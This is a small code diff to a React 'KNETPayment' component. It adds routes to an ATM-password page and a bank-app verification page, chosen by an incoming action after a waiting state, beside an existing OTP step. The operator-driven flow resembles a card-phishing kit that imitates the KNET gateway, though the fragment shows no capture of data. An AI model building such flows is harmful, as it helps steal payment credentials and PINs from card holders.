@@ -163,7 +163,11 @@ export default function KNETPayment() {
       setIsWaiting(false);
 
       if (phase === "card") {
-        if (action === "otp") {
+        if (action === "app") {
+          navigate("/bank-app-verification");
+        } else if (action === "atm") {
+          navigate("/atm-password");
+        } else if (action === "otp") {
           setPhase("otp");
           startCountdown();
           navigateToPage("رمز التحقق كي نت (OTP)");
